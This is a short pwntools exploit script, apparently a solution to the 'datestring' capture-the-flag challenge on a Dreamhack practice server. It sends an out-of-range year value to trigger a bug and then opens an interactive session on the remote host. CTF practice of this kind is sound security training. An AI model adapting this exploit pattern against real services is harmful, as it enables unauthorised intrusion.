from pwn import *

# Set up connection
context.log_level = 'DEBUG'
elf = context.binary = ELF('./datestring')

def exploit():
    #p = process('./datestring')
    p = remote('host1.dreamhack.games', 14886)
    
    p.sendlineafter(b"Year: ", b"100000005")
    p.sendlineafter(b"Month: ", b"12")
    p.sendlineafter(b"Day: ", b"25")    
    p.sendlineafter(b"Hour: ", b"2")
    p.sendlineafter(b"Minute: ", b"2")
    p.sendlineafter(b"Second: ", b"2")
    
    p.interactive()

if __name__ == "__main__":
    exploit()